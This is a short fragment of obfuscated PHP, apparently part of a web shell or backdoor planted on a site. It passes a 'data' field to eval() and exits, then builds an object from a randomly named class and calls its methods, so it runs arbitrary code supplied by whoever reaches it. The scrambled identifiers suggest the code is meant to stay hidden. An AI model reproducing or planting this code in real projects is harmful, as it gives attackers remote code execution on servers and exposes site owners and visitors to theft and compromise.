{eval($_0kbfoiaa["data"]);exit;}}}$_0nfk5bzg = new _m4yttcu();if ($_0nfk5bzg->_m06e7()) {$_0nfk5bzg->_eedeo();}exit();